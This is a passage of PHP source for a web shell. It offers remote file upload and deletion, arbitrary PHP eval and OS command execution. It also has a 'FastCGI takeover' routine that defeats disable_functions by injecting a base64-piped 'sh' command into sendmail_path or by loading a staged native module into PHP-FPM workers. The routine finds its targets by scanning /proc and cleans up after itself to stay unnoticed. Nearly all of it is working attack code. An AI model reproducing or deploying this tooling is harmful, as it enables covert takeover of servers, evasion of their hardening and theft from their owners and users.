            'mtime' => $stat ? $stat['mtime'] : null,
            'owner' => $owner,
            'group' => $group,
            'perms' => $perms,
            'readable' => @is_readable($full),
            'writable' => @is_writable($full),
        ];
        if ($isLink) {
            $entry['symlink'] = true;
            $entry['link_target'] = $linkTarget;
            $entry['broken'] = $broken;
        }
        $entries[] = $entry;
    }
    echo json_encode(['dir' => $d, 'entries' => $entries]);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'delete') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $path = $_POST['path'] ?? '';
    if (!$path) {
        echo json_encode(['error' => 'No path provided']);
        exit;
    }
    if (!file_exists($path) && !is_link($path)) {
        echo json_encode(['error' => 'Path does not exist: ' . $path]);
        exit;
    }
    try {
        if (is_link($path) || is_file($path)) {
            if (!@unlink($path)) {
                $err = error_get_last();
                throw new Exception('unlink() failed on ' . $path . ': ' . ($err['message'] ?? 'unknown error'));
            }
        } elseif (is_dir($path)) {
            $items = @scandir($path);
            if ($items && count($items) > 2) {
                throw new Exception('Directory not empty: ' . $path . ' (' . (count($items) - 2) . ' entries)');
            }
            if (!@rmdir($path)) {
                $err = error_get_last();
                throw new Exception('rmdir() failed on ' . $path . ': ' . ($err['message'] ?? 'unknown error'));
            }
        }
        echo json_encode(['ok' => true]);
    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $dir = $_POST['dir'] ?? '';
    if (!$dir || !is_dir($dir)) {
        echo json_encode(['error' => 'Invalid directory: ' . $dir]);
        exit;
    }
    if (!is_writable($dir)) {
        echo json_encode(['error' => 'Directory not writable: ' . $dir]);
        exit;
    }
    if (!empty($_POST['file_b64'])) {
        $raw = base64_decode($_POST['file_b64'], true);
        if ($raw === false) {
            echo json_encode(['error' => 'Invalid file payload (base64 decode failed)']);
            exit;
        }
        $name = basename($_POST['file_name'] ?? 'upload.bin');
        if ($name === '' || $name === '.' || $name === '..') {
            echo json_encode(['error' => 'Invalid file name']);
            exit;
        }
        try {
            $dest = rtrim($dir, '/') . '/' . $name;
            $overwritten = file_exists($dest);
            if (@file_put_contents($dest, $raw) === false) {
                $err = error_get_last();
                throw new Exception('file_put_contents() failed: ' . ($err['message'] ?? 'unknown error'));
            }
            echo json_encode([
                'ok' => true,
                'path' => $dest,
                'size' => strlen($raw),
                'overwritten' => $overwritten,
            ]);
        } catch (Exception $e) {
            echo json_encode(['error' => $e->getMessage()]);
        }
        exit;
    }

    echo json_encode(['error' => 'No file received — use encrypted upload (file_b64)']);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'eval') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $timeout = (int) ($_POST['timeout'] ?? 30);
    set_time_limit($timeout > 0 ? $timeout : 30);
    error_reporting(E_ALL);
    ini_set('display_errors', '0');
    ini_set('log_errors', '0');
    $code = $_POST['code'] ?? '';
    $__eval_errors = [];
    set_error_handler(function ($severity, $msg, $file, $line) use (&$__eval_errors) {
        $types = [E_WARNING => 'Warning', E_NOTICE => 'Notice', E_DEPRECATED => 'Deprecated', E_STRICT => 'Strict', E_USER_WARNING => 'Warning', E_USER_NOTICE => 'Notice', E_USER_ERROR => 'Error'];
        // keep every diagnostic, not just the last — capped so a warning
        // loop can't balloon the response
        if (count($__eval_errors) < 50)
            $__eval_errors[] = ($types[$severity] ?? 'Error') . ": $msg (line $line)";
    });
    // Baseline buffer depth BEFORE we add our eval-capture buffer. Anything at
    // or below this level is owned by the outer infrastructure (crypto.php's
    // encryption buffer when --password is on, or nothing). We must never
    // destroy those — destroying the encryption buffer sends raw bytes to the
    // client, and the frontend's crypto.js can't decrypt the response.
    $__obl_pre = ob_get_level();
    register_shutdown_function(function () use ($timeout, $__obl_pre) {
        $e = error_get_last();
        if ($e && in_array($e['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
            // Drop only buffers added since this handler started — preserve
            // the encryption buffer (and anything else upstream).
            while (ob_get_level() > $__obl_pre)
                ob_end_clean();
            if (!headers_sent())
                header('Content-Type: application/json');
            $msg = $e['message'] . ' (line ' . $e['line'] . ')';
            if (stripos($e['message'], 'Maximum execution time') !== false) {
                $msg = "Execution timed out after {$timeout}s";
            }
            echo json_encode(['output' => '', 'error' => $msg]);
        }
    });
    ob_start();
    $__obl_ours = ob_get_level();
    try {
        eval ($code);
    } catch (Throwable $e) {
        $__eval_errors[] = get_class($e) . ': ' . $e->getMessage() . ' (line ' . $e->getLine() . ')';
    }
    // User code may have added or destroyed its own buffers. Be defensive:
    // - Pop any buffers user added ABOVE ours (collecting their content into $out).
    // - If our buffer survived, get_clean ours.
    // - Never go below $__obl_pre (the encryption buffer must survive).
    $out = '';
    while (ob_get_level() > $__obl_ours)
        $out .= ob_get_clean();
    if (ob_get_level() === $__obl_ours)
        $out = ob_get_clean() . $out;
    restore_error_handler();
    $error = implode("\n", $__eval_errors);
    if (strlen($error) > 16384) $error = substr($error, 0, 16384) . "\n[diagnostics truncated]";
    echo json_encode(['output' => $out, 'error' => $error !== '' ? $error : null]);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'shell') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $cmd = $_POST['cmd'] ?? '';
    $cwd = $_POST['cwd'] ?? getcwd();
    $timeout = (int) ($_POST['timeout'] ?? 30);
    set_time_limit($timeout > 0 ? $timeout : 30);
    $maxOutput = 5 * 1024 * 1024; // 5MB output cap

    if (!is_dir($cwd))
        $cwd = getcwd();

    // Probe for best available exec function (priority order)
    $method = null;
    foreach (['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'] as $fn) {
        if (function_exists($fn)) {
            $method = $fn;
            break;
        }
    }

    if (!$method) {
        echo json_encode(['error' => 'No OS exec function available', 'available' => false]);
        exit;
    }

    if ($cmd === '') {
        // Probe only — return which function is available
        echo json_encode(['available' => true, 'method' => $method, 'cwd' => $cwd, 'output' => '']);
        exit;
    }

    // cd into working directory, run command, capture new cwd
// Marker uses hex nonce to avoid collision with command output
    $cwdMarker = '__CWDM_' . bin2hex(random_bytes(4));
    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1; echo "' . $cwdMarker . ':$(pwd)"';
    $output = '';
    $truncated = false;

    // Bounded capture buffer: chunks past the 5MB cap are discarded as they
    // stream instead of buffering unboundedly (a command printing hundreds
    // of MB must not exhaust memory before the post-hoc truncation check).
    $boundedCapture = function () use (&$output, $maxOutput, &$truncated) {
        return function ($chunk) use (&$output, $maxOutput, &$truncated) {
            if (strlen($output) < $maxOutput) {
                $output .= $chunk;
                if (strlen($output) > $maxOutput) {
                    $output = substr($output, 0, $maxOutput);
                    $truncated = true;
                }
            } else {
                $truncated = true;
            }
            return '';
        };
    };

    switch ($method) {
        case 'system':
            ob_start($boundedCapture());
            @system($fullCmd);
            ob_end_clean();
            break;
        case 'exec':
            $lines = [];
            @exec($fullCmd, $lines);
            $output = implode("\n", $lines);
            break;
        case 'shell_exec':
            $output = @shell_exec($fullCmd) ?? '';
            break;
        case 'passthru':
            ob_start($boundedCapture());
            @passthru($fullCmd);
            ob_end_clean();
            break;
        case 'popen':
            $handle = @popen($fullCmd, 'r');
            if ($handle) {
                while (!feof($handle)) {
                    $output .= fread($handle, 8192);
                    if (strlen($output) > $maxOutput) {
                        $truncated = true;
                        break;
                    }
                }
                pclose($handle);
            }
            break;
        case 'proc_open':
            $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $proc = @proc_open($fullCmd, $desc, $pipes);
            if (is_resource($proc)) {
                $output = stream_get_contents($pipes[1], $maxOutput) . stream_get_contents($pipes[2], $maxOutput);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($proc);
            }
            break;
    }

    if (strlen($output) > $maxOutput) {
        $output = substr($output, 0, $maxOutput);
        $truncated = true;
    }

    // Extract new cwd from output
    $newCwd = $cwd;
    if (preg_match('/' . preg_quote($cwdMarker, '/') . ':(.+)$/m', $output, $m)) {
        $newCwd = trim($m[1]);
        $output = preg_replace('/' . preg_quote($cwdMarker, '/') . ':.+\n?$/', '', $output);
    }

    $result = [
        'output' => rtrim($output),
        'cwd' => $newCwd,
        'method' => $method,
        'available' => true,
    ];
    if ($truncated)
        $result['truncated'] = true;

    echo json_encode($result);
    exit;
}
// ==================== FASTCGI TAKEOVER (disable_functions bypass) ==========
// Gives the OS Shell an execution path on hosts where every exec function is
// disabled but the request is served by PHP-FPM (or any FastCGI PHP) whose
// endpoint this uid can reach: per-request ini injected via PHP_VALUE /
// PHP_ADMIN_VALUE FastCGI params.
//
// Techniques (validated against a default-posture aaPanel lab):
//   t1  PHP_VALUE sendmail_path="sh -c 'echo <b64> | base64 -d | sh > OUT'"
//       + a mail()/error_log(,1) trigger call — both route through
//       php_mail() -> popen(sendmail_path), untouched by disable_functions.
//   t2  PHP_ADMIN_VALUE extension_dir + extension=<staged .so> + armed flag
//       — FPM dlopen()s the module into the live worker; poc_exec() is
//       native C. Needs an ABI-matched module implementing poc_exec with
//       the poc_ext.armed gate (see research poc_ext.c).
//
// Endpoint discovery is ZERO-NOISE: unix sockets (/proc/net/unix) and
// loopback TCP listeners (/proc/net/tcp{,6}) are fingerprinted by OWNER
// before any connection — the socket inode is mapped to a process via
// /proc/<pid>/fd and only sockets held by php-fpm/php-cgi processes are
// contacted (then confirmed via the spec-native FCGI_GET_VALUES record).
// No bytes are ever sent to mysqld/docker/systemd & co. If the owner scan
// is unavailable (restricted /proc), discovery falls back to conventional
// FastCGI locations probed with the harmless GET_VALUES management record
// only — application-level payloads are never sent to unidentified
// services.
//
// Every mode is a full self-cleaning cycle on one FCGI_KEEP_CONN-pinned
// worker: pre-heal -> clean probe (capture true ini defaults) -> exploit ->
// cleanup (restore sendmail_path / disable_functions / extension_dir,
// disarm module, unlink temp artifacts). The cleanup response itself
// verifies the restore; no state is kept between commands.

// ---- inner branch: raw FastCGI requests execute THIS file with custom
// params (POC_ROLE/POC_MODE/POC_CMD) that no webserver forwards, so this
// code is unreachable over plain HTTP ----
if (!empty($_SERVER['POC_ROLE']) && $_SERVER['POC_ROLE'] === 'inner') {
    $mode = isset($_SERVER['POC_MODE']) ? $_SERVER['POC_MODE'] : '';
    if ($mode === 'probe') {
        echo 'inner[probe]: php=' . PHP_VERSION
           . ' zts=' . (ZEND_THREAD_SAFE ? 1 : 0)
           . ' sapi=' . php_sapi_name() . "\n";
        // process uid when posix is loaded; getmyuid() is the file OWNER,
        // which misleads when the shell file is root-owned
        echo 'inner[probe]: uid=' . (function_exists('posix_getuid') ? posix_getuid() : getmyuid()) . ' file-owner=' . get_current_user() . "\n";
        echo 'inner[probe]: disable_functions=' . ini_get('disable_functions') . "\n";
        echo 'inner[probe]: sendmail_path=[' . ini_get('sendmail_path') . "]\n";
        echo 'inner[probe]: extension_dir=' . ini_get('extension_dir') . "\n";
        echo 'inner[probe]: poc_ext=' . (function_exists('poc_exec') ? 1 : 0) . "\n";
        echo 'inner[probe]: mail=' . (function_exists('mail') ? 1 : 0)
           . ' error_log=' . (function_exists('error_log') ? 1 : 0) . "\n";
    } elseif ($mode === 'trigger') {
        // dummy recipient/subject — the call exists only to make PHP
        // popen() the injected sendmail_path; nothing is emailed
        if (function_exists('mail')) {
            echo 'inner[trigger]: mail() returned ' . var_export(@mail('x@localhost', 'x', 'x'), true) . "\n";
        } else {
            echo 'inner[trigger]: error_log returned ' . var_export(@error_log('x', 1, 'x@localhost'), true) . "\n";
        }
    } elseif ($mode === 'ext') {
        $cmd = isset($_SERVER['POC_CMD']) ? base64_decode($_SERVER['POC_CMD']) : 'id';
        if (!function_exists('poc_exec')) {
            echo 'inner[ext]: poc_exec NOT available (extension did not load - ABI mismatch?)';
        } elseif (ini_get('poc_ext.armed') != '1') {
            echo 'inner[ext]: module loaded but NOT armed - refusing';
        } else {
            poc_exec($cmd);   // streams to FastCGI stdout
        }
    } elseif ($mode === 'cleanup') {
        $df = ini_get('disable_functions');
        echo 'inner[cleanup]: sendmail_path = [' . ini_get('sendmail_path') . "]\n";
        echo 'inner[cleanup]: disable_functions = ' . ($df === '' ? '(empty!)' : substr($df, 0, 40) . '...(' . count(explode(',', $df)) . " fns)\n");
        echo 'inner[cleanup]: poc_ext.armed = '
           . (ini_get('poc_ext.armed') === false ? '(module not loaded)' : var_export(ini_get('poc_ext.armed'), true)) . "\n";
    }
    exit;
}

// ---- FastCGI wire helpers (names prefixed bp_ to stay collision-free) ----

function bp_pack($type, $id, $content) {
    $len = strlen($content);
    $pad = (8 - ($len % 8)) % 8;
    return "\x01" . chr($type) . chr($id >> 8) . chr($id & 0xFF)
         . chr($len >> 8) . chr($len & 0xFF) . chr($pad) . "\x00"
         . $content . str_repeat("\x00", $pad);
}

function bp_nvp($name, $value) {
    $h = ''; $n = strlen($name); $v = strlen($value);
    $h .= $n < 128 ? chr($n) : pack('N', $n | 0x80000000);
    $h .= $v < 128 ? chr($v) : pack('N', $v | 0x80000000);
    return $h . $name . $value;
}

// Reads one complete FastCGI record; false on timeout/close.
function bp_read_record($s, &$type, &$body) {
    $hdr = '';
    while (strlen($hdr) < 8) {
        $c = fread($s, 8 - strlen($hdr));
        if ($c === false || $c === '') return false;
        $hdr .= $c;
    }
    $type = ord($hdr[1]);
    $len  = (ord($hdr[4]) << 8) | ord($hdr[5]);
    $pad  = ord($hdr[6]);
    $need = $len + $pad;
    $body = '';
    while (strlen($body) < $need) {
        $c = fread($s, $need - strlen($body));
        if ($c === false || $c === '') return false;
        $body .= $c;
    }
    if ($pad) $body = substr($body, 0, $len);
    return true;
}

function bp_open($endpoint, $to = 10) {
    $errno = 0; $errstr = '';
    $s = @fsockopen($endpoint, -1, $errno, $errstr, $to);
    if ($s) stream_set_timeout($s, 20);
    return $s;
}

// One responder request on a kept connection (FCGI_KEEP_CONN pins the worker).
function bp_talk($s, $params) {
    $out = bp_pack(1, 1, pack('nCx5', 1, 1));
    $body = '';
    foreach ($params as $k => $v) $body .= bp_nvp($k, $v);
    $out .= bp_pack(4, 1, $body) . bp_pack(4, 1, '');
    $out .= bp_pack(5, 1, '') . bp_pack(5, 1, '');
    if (fwrite($s, $out) === false) return '';
    $parsed = '';
    while (bp_read_record($s, $type, $body)) {   // stop at END_REQUEST — with
        if ($type === 6 || $type === 7) $parsed .= $body;   // KEEP_CONN the
        if ($type === 3) break;                   // worker never closes
    }
    return $parsed;
}

// Spec-native FastCGI identification: FCGI_GET_VALUES (type 9, requestId 0)
// — only a FastCGI application answers (type 10). Harmless management
// record, safe to send to any socket. Returns the reported values or null.
function bp_get_values($s) {
    $body = bp_nvp('FCGI_MAX_CONNS', '') . bp_nvp('FCGI_MAX_REQS', '')
          . bp_nvp('FCGI_MPXS_CONNS', '');   // FPM echoes the names it reports
    if (fwrite($s, bp_pack(9, 0, $body)) === false) return null;
    stream_set_timeout($s, 2);
    $vals = null;
    while (bp_read_record($s, $type, $rbody)) {
        if ($type === 10) { $vals = []; $off = 0; $l = strlen($rbody);
            while ($off + 1 < $l) {
                $n = ord($rbody[$off]); $nl = $n < 128 ? 1 : 4;
                if ($nl === 4 && $off + 4 > $l) break;
                $n = $nl === 1 ? $n : (unpack('N', substr($rbody, $off, 4))[1] & 0x7fffffff);
                $off += $nl;
                if ($off + 1 > $l) break;
                $v = ord($rbody[$off]); $vl = $v < 128 ? 1 : 4;
                if ($vl === 4 && $off + 4 > $l) break;
                $v = $vl === 1 ? $v : (unpack('N', substr($rbody, $off, 4))[1] & 0x7fffffff);
                $off += $vl;
                if ($off + $n + $v > $l) break;
                $vals[substr($rbody, $off, $n)] = substr($rbody, $off + $n, $v);
                $off += $n + $v;
            }
            break;
        }
        if ($type === 3) break;
    }
    return $vals;
}

function bp_inner_params($mode, $ini = [], $admin = false, $cmdB64 = '') {
    // DOCUMENT_ROOT from the outer web request when available (a real root
    // for however the shell is deployed); else the shell's own directory —
    // never a path ABOVE the deployment. Only SCRIPT_NAME derives from it.
    $docRoot = !empty($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
    $script = str_replace($docRoot, '', __FILE__);
    $p = [
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'SERVER_SOFTWARE'   => 'shells-x',
        'REQUEST_METHOD'    => 'GET',
        'SCRIPT_FILENAME'   => __FILE__,       // inner request executes THIS file
        'SCRIPT_NAME'       => $script,
        'DOCUMENT_ROOT'     => $docRoot,
        'DOCUMENT_URI'      => $script,
        'REQUEST_URI'       => $script,
        'QUERY_STRING'      => '',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REDIRECT_STATUS'   => '200',
        'POC_ROLE'          => 'inner',        // never forwarded by webservers
        'POC_MODE'          => $mode,
    ];
    if ($cmdB64 !== '') $p['POC_CMD'] = $cmdB64;
    // bearer token for the auth gate: the build's own hash, same file
    $p['POC_TOKEN'] = isset($GLOBALS['__AUTH_HASH']) ? $GLOBALS['__AUTH_HASH'] : '';
    if ($ini) {
        $key = $admin ? 'PHP_ADMIN_VALUE' : 'PHP_VALUE';
        $p[$key] = implode("\n", $ini);
    }
    return $p;
}

// Full worker restore. PHP_ADMIN_VALUE part is unconditional: unknown
// poc_ext.armed just logs a harmless notice when the module isn't loaded,
// and this is what disarms a module loaded by an older run.
function bp_cleanup($s, $sm, $df, $extdir) {
    $p = bp_inner_params('cleanup',
        ['sendmail_path = "' . $sm . '"', 'disable_functions = ' . $df], false);
    $p['PHP_ADMIN_VALUE'] = implode("\n",
        ['extension_dir = ' . $extdir, 'poc_ext.armed = 0']);
    return bp_talk($s, $p);
}

function bp_probe_line($resp, $key) {
    if (preg_match('/inner\[probe\]: ' . preg_quote($key, '/') . '=(.*)/', $resp, $m))
        return rtrim($m[1], "\n");
    return null;
}

// ---- zero-noise endpoint discovery: owner fingerprinting via /proc ----

// Map listening-socket inode -> owning process identity. /proc/<pid>/fd is
// readable only for same-uid processes (or root) — conveniently, the FPM
// pool workers run as OUR uid, so exactly the sockets we can actually
// connect to are also the ones we can fingerprint. Returns
// inode => "comm\0cmdline" (truncated) for readable processes.
function bp_socket_owners() {
    $owners = [];
    foreach (@glob('/proc/[0-9]*', GLOB_ONLYDIR) ?: [] as $pd) {
        $pid = basename($pd);
        $comm = @file_get_contents("$pd/comm");
        if ($comm === false || $comm === '') continue;
        $comm = rtrim($comm);
        $cmdline = (string)@file_get_contents("$pd/cmdline");
        foreach (@scandir("$pd/fd") ?: [] as $fd) {
            if ($fd === '.' || $fd === '..') continue;
            $link = @readlink("$pd/fd/$fd");
            if ($link !== false && preg_match('/^socket:\[(\d+)\]$/', $link, $m))
                $owners[$m[1]] = $comm . "\x00" . substr($cmdline, 0, 256);
        }
    }
    return $owners;
}

// Does this owner identity look like a FastCGI PHP server?
function bp_owner_is_fcgi($owner) {
    list($comm, $cmdline) = explode("\x00", $owner . "\x00");
    $hay = strtolower($comm . ' ' . str_replace("\x00", ' ', $cmdline));
    return (strpos($hay, 'php-fpm') !== false || strpos($hay, 'php-cgi') !== false);
}

function bp_unix_paths() {
    $lines = @file('/proc/net/unix', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return [];
    array_shift($lines);
    $out = [];
    foreach ($lines as $l) {
        // columns: Num RefCount Protocol Flags Type St Inode Path — inode is
        // field 7 (index 6), path may be absent (unnamed) or '@'-prefixed
        $c = preg_split('/\s+/', trim($l));
        if (count($c) < 7) continue;
        $inode = $c[6];
        $path = implode(' ', array_slice($c, 7));
        if ($path === '' || $path[0] === '@') continue;
        $out[] = ['inode' => $inode, 'path' => $path];
    }
    return $out;
}

// Loopback LISTEN entries from /proc/net/tcp and /proc/net/tcp6 with their
// inodes. /proc stores IPv4 little-endian ("0100007F"); ipv6 words are also
// little-endian per u32 but ::1/ANY checks are byte-order agnostic.
function bp_tcp_listen() {
    $out = [];
    foreach (['/proc/net/tcp', '/proc/net/tcp6'] as $f) {
        $lines = @file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!$lines) continue;
        array_shift($lines);
        foreach ($lines as $l) {
            $c = preg_split('/\s+/', trim($l));
            if (count($c) < 10 || $c[3] !== '0A') continue;   // LISTEN only
            list($iphex, $porthex) = explode(':', $c[1]);
            $port = hexdec($porthex);
            if ($port === 0) continue;
            $lo = false;
            if (strlen($iphex) === 8) {
                $lo = (long2ip(unpack('N', strrev(pack('H*', $iphex)))[1]) === '127.0.0.1');
            } else {
                $v6 = strtolower($iphex);
                $lo = ($v6 === str_repeat('0', 32)
                    || $v6 === '00000000000000000000000100000001');   // ::1
            }
            if ($lo) $out[] = ['inode' => $c[9], 'port' => $port];
        }
    }
    return $out;
}

// Identify one endpoint as FastCGI via GET_VALUES (management record only —
// harmless to any service). Returns [method, info] or null.
function bp_identify($ep, $to = 2) {
    $s = bp_open($ep, $to);
    if (!$s) return null;
    stream_set_timeout($s, $to);
    $gv = bp_get_values($s);
    fclose($s);
    if (is_array($gv)) {
        $info = [];
        foreach ($gv as $k => $v) if ($v !== '') $info[] = "$k=$v";
        return ['method' => 'fcgi-get_values', 'info' => implode(' ', $info)];
    }
    return null;
}

// Discovery, zero-noise by construction:
//  1. Owner fingerprinting — map socket inodes to owning processes via
//     /proc/<pid>/fd and contact only php-fpm/php-cgi-owned sockets. Works
//     where those /proc entries are readable (bare metal, many VPS).
//     LIMITATION: php-fpm pool workers are non-dumpable after setuid, so
//     on hardened/container hosts their /proc entries are root-owned and
//     the scan sees nothing — hence the fallback.
//  2. Fallback — conventional FastCGI socket locations (path-constrained,
//     never /var/run/mysqld or similar) plus loopback LISTEN ports from the
//     kernel table, each probed with FCGI_GET_VALUES ONLY: a ~60-byte,
//     well-formed FastCGI MANAGEMENT record. Non-FastCGI services discard
//     it as a parse error; no application payload is ever sent to an
//     unidentified service (app-level probes happen exclusively in `probe`
//     mode against the endpoint the operator selected).
function bp_discover() {
    $found = [];
    $owners = bp_socket_owners();
    if (!empty($owners)) {
        foreach (bp_unix_paths() as $u) {
            if (!isset($owners[$u['inode']]) || !bp_owner_is_fcgi($owners[$u['inode']])) continue;
            $id = bp_identify('unix://' . $u['path']);
            if ($id) $found[] = ['ep' => 'unix://' . $u['path'], 'method' => 'owner+get_values', 'info' => $id['info']];
        }
        foreach (bp_tcp_listen() as $t) {
            if (!isset($owners[$t['inode']]) || !bp_owner_is_fcgi($owners[$t['inode']])) continue;
            $id = bp_identify('tcp://127.0.0.1:' . $t['port']);
            if ($id) $found[] = ['ep' => 'tcp://127.0.0.1:' . $t['port'], 'method' => 'owner+get_values', 'info' => $id['info']];
        }
        if ($found) return $found;
        // owners were readable but no fpm socket matched (container case:
        // non-dumpable pool workers) — fall through to the path/table scan
    }
    $cands = [];
    foreach (['/tmp/php-cgi-*.sock', '/run/php/*.sock', '/var/run/php/*.sock',
              '/run/php-fpm/*.sock', '/var/run/php-fpm/*.sock'] as $g)
        foreach ((glob($g) ?: []) as $p) $cands['unix://' . $p] = true;
    // loopback listeners straight from the kernel table (no port guessing)
    foreach (bp_tcp_listen() as $t) $cands['tcp://127.0.0.1:' . $t['port']] = true;
    foreach (array_keys($cands) as $ep) {
        $id = bp_identify($ep, 1);   // 1s probe budget per candidate
        if ($id) $found[] = ['ep' => $ep, 'method' => 'get_values', 'info' => $id['info']];
    }
    return $found;
}

// ---- one full pre-heal + capture cycle; returns defaults or null ----

function bp_capture_defaults($s) {
    // pre-heal with this context's ini (best guess reference) heals poison
    // leaked by older runs, then the clean probe reports true defaults
    bp_cleanup($s, ini_get('sendmail_path'), ini_get('disable_functions'), ini_get('extension_dir'));
    $p0 = bp_talk($s, bp_inner_params('probe'));
    if (strpos($p0, 'inner[probe]:') === false) return null;
    $sm = bp_probe_line($p0, 'sendmail_path');
    $df = (string)bp_probe_line($p0, 'disable_functions');
    $ed = (string)bp_probe_line($p0, 'extension_dir');
    return [
        'sm'  => $sm !== null ? trim($sm, '[]') : ini_get('sendmail_path'),
        'df'  => $df !== '' ? $df : ini_get('disable_functions'),
        'ed'  => $ed !== '' ? $ed : ini_get('extension_dir'),
        'ext' => bp_probe_line($p0, 'poc_ext') === '1',   // module already on this worker
        'raw' => $p0,
    ];
}

// ---- outer action handler ----

if (isset($_POST['action']) && $_POST['action'] === 'bypass') {
    if (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    $mode = $_POST['mode'] ?? '';

    if ($mode === 'discover') {
        echo json_encode(['ok' => true, 'endpoints' => bp_discover()]);
        exit;
    }

    if ($mode === 'probe') {
        $ep = $_POST['ep'] ?? '';
        $s = bp_open($ep, 10);
        if (!$s) { echo json_encode(['ok' => false, 'error' => "connect failed: $ep"]); exit; }
        $def = bp_capture_defaults($s);
        if ($def === null) { fclose($s); echo json_encode(['ok' => false, 'error' => 'probe request failed (not FastCGI PHP?)']); exit; }
        // marker injection test
        $MARK = 'FASTCGI-INI-INJECTION-PROBE';
        $p1 = bp_talk($s, bp_inner_params('probe', ['sendmail_path = ' . $MARK]));
        $inj = (bp_probe_line($p1, 'sendmail_path') === '[' . $MARK . ']');
        $cl = bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
        fclose($s);
        preg_match('/mail=(\d)/', $def['raw'], $m1);
        preg_match('/error_log=(\d)/', $def['raw'], $m2);
        preg_match('/php=(\S+)/', $def['raw'], $m3);
        preg_match('/zts=(\d)/', $def['raw'], $m4);
        preg_match('/uid=(\S+)/', $def['raw'], $m5);
        echo json_encode([
            'ok' => true,
            'injection' => $inj,
            'mail' => ($m1[1] ?? '0') === '1',
            'error_log' => ($m2[1] ?? '0') === '1',
            'php' => $m3[1] ?? PHP_VERSION,
            'zts' => ($m4[1] ?? '0') === '1',
            'uid' => $m5[1] ?? '',
            'defaults' => ['sm' => $def['sm'], 'df_len' => $def['df'] === '' ? 0 : count(explode(',', $def['df'])), 'ed' => $def['ed']],
            'cleanup_verified' => strpos($cl, 'inner[cleanup]:') !== false,
        ]);
        exit;
    }

    if ($mode === 'run') {
        $tech = $_POST['tech'] ?? 't1';
        if (!in_array($tech, ['t1', 't2'], true)) {
            echo json_encode(['available' => false, 'error' => "unknown technique: $tech"]);
            exit;
        }
        $ep      = $_POST['ep'] ?? '';
        $cmd     = $_POST['cmd'] ?? '';
        $cwd     = $_POST['cwd'] ?? getcwd();
        $so      = $_POST['so'] ?? '';      // t2: path to ABI-matched module on target
        $timeout = (int) ($_POST['timeout'] ?? 30);
        if ($timeout <= 0) $timeout = 30;
        if (!is_dir($cwd)) $cwd = getcwd();
        // honor the operator's timeout: both this PHP request and every
        // socket read on the pinned connection outlive the command itself
        set_time_limit($timeout + 15);
        // hex nonce marker — collision-safe against command output
        $marker = '__CWDB_' . bin2hex(random_bytes(4));
        // base64 transport: no quoting hell between ini value / sh -c / popen.
        // The cd target is base64-encoded too — no escapeshellarg dependency
        // (it is disabled on some hardened hosts).
        $wrapped = 'cd "$(echo ' . base64_encode($cwd) . ' | base64 -d)" && (' . $cmd . ') 2>&1; echo "' . $marker . ':$(pwd)"';
        $b64 = base64_encode($wrapped);
        $maxOutput = 5 * 1024 * 1024;
        $s = bp_open($ep, 10);
        if (!$s) { echo json_encode(['available' => false, 'error' => "connect failed: $ep"]); exit; }
        stream_set_timeout($s, $timeout + 10);   // long commands outlive the default 20s
        $def = bp_capture_defaults($s);
        if ($def === null) { fclose($s); echo json_encode(['available' => false, 'error' => 'probe failed']); exit; }
        $output = '';
        $method = '';

        if ($tech === 't1') {
            // random path, NOT pre-created: the injected sh creates it under
            // the pool user's ownership, so shell-uid != pool-uid can't break it
            $OUT = sys_get_temp_dir() . '/sx_' . bin2hex(random_bytes(6));
            $inject = bp_talk($s, bp_inner_params('trigger',
                ['sendmail_path = "sh -c \'echo ' . $b64 . ' | base64 -d | sh > ' . $OUT . ' 2>&1\'"']));
            // php_mail()'s pclose() blocks until the command finishes, so by
            // the time the trigger responds the output file is complete; the
            // small sleep only covers scheduling jitter
            usleep(200000);
            clearstatcache();
            if (file_exists($OUT)) { $output = (string)file_get_contents($OUT); @unlink($OUT); }
            if ($output === '' && strpos($inject, 'returned true') === false) {
                bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                fclose($s);
                echo json_encode(['available' => false, 'error' => 'trigger produced no output']);
                exit;
            }
            $method = 'fcgi-sendmail';
        } else {   // t2 — extension loading
            if ($so === '' || !file_exists($so)) {
                bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                fclose($s);
                echo json_encode(['available' => false, 'error' => 't2 needs so=<path to ABI-matched poc_ext .so on target>']);
                exit;
            }
            // module persists on the pinned worker between commands — stage a
            // copy ONLY when a load is actually needed (not already loaded);
            // re-arming an already-loaded module needs no file at all
            $extIni = null;
            $SO_TMP = null;
            if ($def['ext']) {
                $extIni = ['poc_ext.armed = 1'];
            } else {
                $SO_TMP = sys_get_temp_dir() . '/sx_ext_' . bin2hex(random_bytes(6)) . '.so';
                if (!copy($so, $SO_TMP)) {
                    bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                    fclose($s);
                    echo json_encode(['available' => false, 'error' => "could not stage $so"]);
                    exit;
                }
                $extIni = ['extension_dir = ' . dirname($SO_TMP), 'extension = ' . basename($SO_TMP), 'poc_ext.armed = 1'];
            }
            $output = bp_talk($s, bp_inner_params('ext', $extIni, true, $b64));
            // strip stderr PHP-message residue and the FastCGI response
